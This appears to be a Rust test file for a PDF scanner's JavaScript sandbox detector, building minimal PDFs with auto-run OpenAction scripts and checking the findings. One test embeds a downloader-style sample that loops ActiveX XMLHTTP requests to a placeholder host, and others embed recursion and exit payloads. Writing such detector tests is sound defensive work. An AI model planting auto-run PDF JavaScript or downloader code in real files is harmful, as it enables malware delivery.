use std::path::PathBuf;

use sis_pdf_core::model::Confidence;
use sis_pdf_core::scan::{CorrelationOptions, FontAnalysisOptions, ProfileFormat, ScanOptions};

#[cfg(feature = "js-sandbox")]
use sis_pdf_detectors::js_sandbox::JavaScriptSandboxDetector;

#[cfg(feature = "js-sandbox")]
fn build_minimal_js_pdf(js_payload: &str) -> Vec<u8> {
    let mut pdf = Vec::new();
    pdf.extend_from_slice(b"%PDF-1.4\n");
    let objects = [
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n".to_string(),
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n".to_string(),
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>\nendobj\n".to_string(),
        format!("5 0 obj\n<< /S /JavaScript /JS ({}) >>\nendobj\n", js_payload),
    ];
    let mut offsets = [0usize; 6];
    for object in &objects {
        let header = object.as_bytes()[0];
        let obj_id = if header == b'1' {
            1
        } else if header == b'2' {
            2
        } else if header == b'3' {
            3
        } else {
            5
        };
        offsets[obj_id] = pdf.len();
        pdf.extend_from_slice(object.as_bytes());
    }
    let start_xref = pdf.len();
    pdf.extend_from_slice(b"xref\n0 6\n");
    pdf.extend_from_slice(b"0000000000 65535 f \n");
    for offset in offsets.iter().skip(1) {
        if *offset == 0 {
            pdf.extend_from_slice(b"0000000000 00000 f \n");
        } else {
            let line = format!("{offset:010} 00000 n \n");
            pdf.extend_from_slice(line.as_bytes());
        }
    }
    pdf.extend_from_slice(b"trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n");
    pdf.extend_from_slice(start_xref.to_string().as_bytes());
    pdf.extend_from_slice(b"\n%%EOF\n");
    pdf
}

#[cfg(feature = "js-sandbox")]
fn default_opts() -> ScanOptions {
    ScanOptions {
        deep: true,
        max_decode_bytes: 32 * 1024 * 1024,
        max_total_decoded_bytes: 256 * 1024 * 1024,
        recover_xref: true,
        parallel: false,
        batch_parallel: false,
        diff_parser: false,
        max_objects: 500_000,
        max_recursion_depth: 64,
        fast: false,
        focus_trigger: None,
        focus_depth: 0,
        yara_scope: None,
        strict: false,
        strict_summary: false,
        ir: false,
        ml_config: None,
        font_analysis: FontAnalysisOptions::default(),
        image_analysis: sis_pdf_core::scan::ImageAnalysisOptions::default(),
        filter_allowlist: None,
        filter_allowlist_strict: false,
        profile: false,
        profile_format: ProfileFormat::Text,
        group_chains: true,
        correlation: CorrelationOptions::default(),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_exec_records_calls() {
    let mut path = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    path.push("../../crates/sis-pdf-core/tests/fixtures/synthetic.pdf");
    let bytes = std::fs::read(path).expect("read fixture");

    let opts = default_opts();

    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
        vec![Box::new(JavaScriptSandboxDetector)];
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, opts, &detectors).expect("scan");

    let sandbox =
        report.findings.iter().find(|f| f.kind == "js_sandbox_exec").expect("sandbox exec finding");
    let calls = sandbox.meta.get("js.runtime.calls").expect("runtime calls");
    assert!(calls.contains("alert"));
    let phase_order = sandbox.meta.get("js.runtime.phase_order").expect("phase order");
    assert!(phase_order.contains("open"));
    assert_eq!(sandbox.meta.get("js.runtime.profile_count").map(String::as_str), Some("3"));
    assert!(sandbox.meta.contains_key("js.runtime.profile_divergence"));
    assert!(sandbox.meta.contains_key("js.runtime.profile_status"));
    assert!(sandbox.meta.contains_key("js.runtime.replay_id"));
    assert_eq!(sandbox.meta.get("js.runtime.ordering").map(String::as_str), Some("deterministic"));
    assert!(matches!(
        sandbox.confidence,
        Confidence::Probable | Confidence::Tentative | Confidence::Weak
    ));
    assert_eq!(sandbox.meta.get("js.sandbox_exec").map(String::as_str), Some("true"));
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_exec_demotes_confidence_when_calls_diverge_across_profiles() {
    let bytes = build_minimal_js_pdf("process.exit\\(0\\);");
    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
        vec![Box::new(JavaScriptSandboxDetector)];
    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
        .expect("scan");

    let sandbox =
        report.findings.iter().find(|f| f.kind == "js_sandbox_exec").expect("sandbox exec finding");
    assert_eq!(sandbox.confidence, Confidence::Tentative);
    assert_eq!(
        sandbox.meta.get("js.runtime.profile_consistency_signal").map(String::as_str),
        Some("calls")
    );
    assert_eq!(
        sandbox.meta.get("js.runtime.profile_consistency_ratio").map(String::as_str),
        Some("0.33")
    );
    assert_eq!(
        sandbox.meta.get("js.runtime.profile_divergence").map(String::as_str),
        Some("divergent")
    );
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_emulation_breakpoint_finding_for_runtime_errors() {
    let bytes = build_minimal_js_pdf("function a.b\\(\\) \\{\\}");
    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
        vec![Box::new(JavaScriptSandboxDetector)];
    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
        .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "js_emulation_breakpoint")
        .expect("js_emulation_breakpoint finding");
    assert_eq!(
        finding.meta.get("js.emulation_breakpoint.buckets").map(String::as_str),
        Some("parser_dialect_mismatch:1")
    );
    assert_eq!(
        finding.meta.get("js.emulation_breakpoint.top_bucket").map(String::as_str),
        Some("parser_dialect_mismatch")
    );
    assert_eq!(finding.meta.get("js.runtime.error_count").map(String::as_str), Some("1"));
    assert!(finding
        .meta
        .get("js.runtime.error_messages")
        .map(|value| value.contains("expected token"))
        .unwrap_or(false));
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_payload_format_mismatch_for_markup_payloads() {
    let bytes = build_minimal_js_pdf("<html><body>not-js</body></html>");
    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
        vec![Box::new(JavaScriptSandboxDetector)];
    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
        .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "js_payload_non_javascript_format")
        .expect("js_payload_non_javascript_format finding");
    assert_eq!(finding.meta.get("js.payload.format_hint").map(String::as_str), Some("html_markup"));
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_recursion_limit_finding_for_recursive_payload() {
    let bytes = build_minimal_js_pdf("function f\\(\\)\\{f\\(\\);\\}f\\(\\);");
    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
        vec![Box::new(JavaScriptSandboxDetector)];
    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
        .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "js_runtime_recursion_limit")
        .expect("js_runtime_recursion_limit finding");
    assert_eq!(finding.meta.get("js.runtime.recursion_limit_hits").map(String::as_str), Some("1"));
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_downloader_loop_pattern_finding() {
    let payload = "for(var i=0;i<2;i++){var x=new ActiveXObject('MSXML2.XMLHTTP');x.Open('GET','http://example.test',false);x.Send();}";
    let bytes = build_minimal_js_pdf(payload);
    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
        vec![Box::new(JavaScriptSandboxDetector)];
    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
        .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "js_runtime_downloader_pattern")
        .expect("js_runtime_downloader_pattern finding");
    assert_eq!(finding.meta.get("js.runtime.downloader.open_calls").map(String::as_str), Some("2"));
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emulation_breakpoint_tracks_loop_iteration_limit_bucket() {
    let payload = "for (var i = 0; i < 50000; i++) { var z = i + 1; }";
    let bytes = build_minimal_js_pdf(payload);
    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
        vec![Box::new(JavaScriptSandboxDetector)];
    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
        .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "js_emulation_breakpoint")
        .expect("js_emulation_breakpoint finding");
    assert!(finding
        .meta
        .get("js.emulation_breakpoint.buckets")
        .map(|value| value.contains("loop_iteration_limit"))
        .unwrap_or(false));
}
